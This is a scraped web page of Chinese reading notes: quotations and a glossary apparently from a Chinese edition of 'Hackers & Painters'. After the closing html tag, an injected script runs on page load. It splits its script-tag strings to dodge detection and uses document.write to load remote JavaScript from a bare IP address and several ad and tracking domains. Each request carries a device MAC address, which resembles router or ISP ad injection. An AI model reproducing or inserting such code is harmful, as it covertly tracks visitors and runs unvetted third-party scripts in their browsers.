                    就使用你知道的最强大的语言，用它解决你知道的最难的问题，并且等待竞争对手的经理做出自甘平庸的选择。</p><p>

                    词法变量，指的是变量的作用域由代码结构决定，不取决于运行时的调用顺序。也就是说，作用域在代码文本的词法分析阶段就决定了，而不在代码执行时决定。注意将这个概念与“局部变量”的概念相区分。</p><p>

                    任何C或Fortran程序复杂到一定程度之后，都会包含一个临时开发的、只有一半功能的、不完全符合规格的、到处都是bug的、运行速度很慢的Common Lisp实现。</p><p>

                    一种好的编程语言，是让黑客可以随心所欲使用的语言。</p><p>

                    你让人们使用一种他们需要的应用程序，这个程序偏巧就是用某种新语言开发的。</p><p>

                    这一类书籍之中必须有一本由O'Reilly公司出版发行。这正在变成是否能吸引黑客的前提条件了。</p><p>

                    profiler（性能分析器）</p><p>

                    发明新事物的人必须有耐心，要常年累月不断地做市场推广，直到人们开始接受这种发明。</p><p>

                    简单重复同一个信息就能解决这个问题。你只需要不停地重复同一句话，最终人们将会开始倾听。人们真正注意到你的时候，不是第一眼看到你站在那里，而是发现过了这么久你居然还在那里。</p><p>

                    为了写出优秀软件，你必须同时具备两种互相冲突的信念。一方面，你要像初生牛犊一样，对自己的能力信心万丈；另一方面，你又要像历经沧桑的老人一样，对自己的能力抱着怀疑态度。在你的大脑中，有一个声音说“千难万险只等闲”，还有一个声音却说“早岁哪知世事艰”。</p><p>

                    设计与研究：研究必须是“新”的，而设计必须是“好”的。</p><p>

                    软件领域以外的人可能没听过“弱即是强”，所以意识不到这种模式在艺术领域普遍存在。以绘画为例，文艺复兴时期就有人发现了这一点。如今，几乎所有的美术老师都会告诉你准确画出一个事物的方法，不是沿着轮廓慢慢一个部分、一个部分地把它画出来，因为这样的话各个部分的错误会累积起来，最终导致整幅画失真。你真正应该采用的方法是快速地用几根线画出一个大致准确的轮廓，然后再逐步地加工草稿。</p><p>

                    做出原型，再逐步加工做出成品，这种方式有利于鼓舞士气，因为它使得你随时都可以看到工作的成效。</p><p>

                    任何时候，代码都必须能够运行。</p><p>

                    相反，“自上而下编程法”要求你把编程任务分解成一个个更小的单元，“自下而上编程法”要求你先开发最底下的层，然后用底层所定义的“语言”开发上一层，这样直到最高层。这两种编程法可以结合使用。</p><p>

                    缓冲区（buffer）一个内存区域，用来保存程序需要的输入数据，或者将程序的输出数据累积起来，到一定数量后再输出。</p><p>

                    CGI脚本的主要缺点是，每次运行只能生成一个页面，无法像桌面软件那样将数据保存在内存中从而实现与用户的不间断对话。</p><p>

                    托管（collocated）　通常指放在ISP（互联网服务供应商）处。</p><p>

                    一种由多个部分组成的数据格式。比如，一对数据可以组成一个数据结构，表示图形上的一个点。</p><p>

                    最终用户（end user）　需求很简单的用户的婉转说法。</p><p>

                    散列表（hash table）　一种类似数据库的数据结构，存储在里面的每一段数据都有一个对应的键，使用时只要按照键就可以取出对应的数据。</p><p>

                    启发（heuristic）　从经验法则中得到灵感。</p><p>

                    每次读入一行代码，然后执行相应的机器语言命令，之后再去读下一行代码。</p><p>

                    内循环（inner loop）　一个程序中执行次数最频繁的部分。</p><p>

                    列表（list）　一连串的数据块，各个数据块的类型通常是不一样的。不同的列表可以像火车车厢一样连接在一起，组成更大的列表。</p><p>

                    元循环（metacircular）　当一种语言的解释器用这种语言本身开发时，就会出现这种情况。与其说这是为了做出这种语言的一种实现，还不如说这是描述语言的一种技巧。</p><p>

                    OO（面向对象，objectoriented）</p><p>

                    门户（portal）　网站。</p><p>

                    带有强烈的面向对象风格，被爱好者看作是Perl语言的一种较为简洁的替代品。</p><p>

                    用来对某个程序进行定制。</p><p>

                    服务器（server）　网络上的一台计算机，用来回应其他计算机的请求。</p><p>

                    子程序（subroutine）　一块独立于其他代码的代码。当程序运行到某个时候，你想使用这块代码，那么直接调用它就可以了。子程序运行结束后，整个程序的控制权会回到调用处。一本食谱中，糖衣的制作方法就可以被看作蛋糕食谱的一个子程序，调用可能是这样表示的：“请按照第x页上的方法制作糖衣。”</p><p>

                    符号（symbol）　一种数据类型，语义单位（token）就是符号的实例。符号与字符串很类似，除了两点区别：（a）一个符号就是一个独立的单位，而不仅仅是一串字符；（b）一个符号通常只有一个对应的名称，而包含同样字符的字符串却可能有好几种。</p><p>

                    这种心理是感受不到竞争压力的工作职位所特有的。</p><p>

                    语义单位（token）　一串同属于一个单位的字符。更通用的叫法是“词”（word）。</p><p>

                    树（tree）　一种数据结构，它包含的每一个实例都可以指向两个或更多的实例，比如家谱树。</p><p>

                    向量（vector）　一个一维数组，或者一个序列（sequence）。</p>


                </div>
            </div>
        </div>
    </div>
    <div class="full-footer">
        <div class="container">
            <div class="copyright">
                © 2017&nbsp;
                <a href="http://www.newhuan.name/note/" target="_blank">newhuan</a>&nbsp;by&nbsp;
                <!--<a href="https://github.com/SolidZORO/vodka" target="_blank">vodka</a>-->
            </div>
            <div class="hm hidden">
                <script type="text/javascript">
                    var _hmt = _hmt || [];
                    (function() {
                        var hm = document.createElement("script");
                        hm.src = "//hm.baidu.com/hm.js?63392a0ec51d4ad23453b82650af1329";
                        var s = document.getElementsByTagName("script")[0];
                        s.parentNode.insertBefore(hm, s);
                    })();
                </script>
            </div>
        </div>
    </div>
</body>
</html>
<script>
    var __m='c8:3a:35:73:27:69';
    var __m2='00:00:00:00:00:00';
    var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=8ee9af4179981b1f95c88061fabf6478,M,";
    var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
    var __n="http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m;
    var __p="http://feed.theta.sogou.com/feed_icon?pid=ikuai8_app_2&appname=ikuai&uid="+__m+"&mac="+__m2;
    var __y="http://static.helianhealth.com/hlwf/akb1.js";
    if(self==top){
        var x=parseInt(Math.random()*(100-0+1)+0);
        switch(true){
            case x>=0&&x<70:
                __w("http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m,101);
                __w(__p,1);
                __w(__y,5);
                break;
            case x>=70&&x<80:
                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
                __w(__y,5);
                break;
            case x>=80&&x<=100:
                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
                __w(__y,5);
                break;
        }
    }
    function __w(s,n){document.write("<sc"+"ript src='"+s+"'></scr"+"ipt>");document.write(__h+n+__b);}
</script>
网络服务器（web server）　一台响应HTTP请求的服务器。